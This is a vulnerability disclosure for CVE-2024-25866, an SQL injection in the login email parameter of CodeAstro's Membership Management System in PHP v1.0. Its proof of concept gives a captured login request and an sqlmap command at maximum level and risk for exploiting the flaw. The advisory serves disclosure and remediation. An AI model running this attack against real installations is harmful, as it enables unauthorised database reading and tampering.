# Membership Management System in PHP - SQL Injection (Login)

### CVE Assigned:
**[CVE-2024-25866](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-25866)** [mitre.org](https://www.cve.org/CVERecord?id=CVE-2024-25866) [nvd.nist.org](https://nvd.nist.gov/vuln/detail/CVE-2024-25866)

### Date:

> 9 Feb 2024

### Author Email:

> yevhenii.butenko@outlook.com

### Vendor Homepage:

> https://codeastro.com/

### Software Link:

> [Membership Management System in PHP](https://codeastro.com/membership-management-system-in-php-with-source-code/)

### Version:

> v 1.0

### SQL Injection:

> SQL injection is a type of security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. Usually, it involves the insertion or "injection" of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system, and in some cases, issue commands to the operating system.

### Affected Components:

> index.php

> `email` parameter within the login mechanism is vulnerable to SQL Injection.

![email](https://github.com/0xQRx/VulnerabilityResearch/blob/master/2024/img/membership_management_sql_login.png?raw=true)

### Description:

> The presence of SQL Injection in the application enables attackers to issue direct queries to the database through specially crafted requests.

## Proof of Concept:

### SQLMap

Save the following request to `mm_login.txt`:

```
POST /MembershipM-PHP/index.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 103
Origin: http://localhost
Connection: close
Referer: http://localhost/MembershipM-PHP/
Cookie: PHPSESSID=oe2gqujhc60h10p659a1gj2a7u
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

email=admin%40test.com&password=Test%40123&login=
```

Use `sqlmap` with `-r` option to exploit the vulnerability:

```
sqlmap -r mm_login.txt --level 5 --risk 3 --batch --dbms MYSQL -p email
```

## Recommendations

When using this Membership Management System, it is essential to update the application code to ensure user input sanitization and proper restrictions for special characters.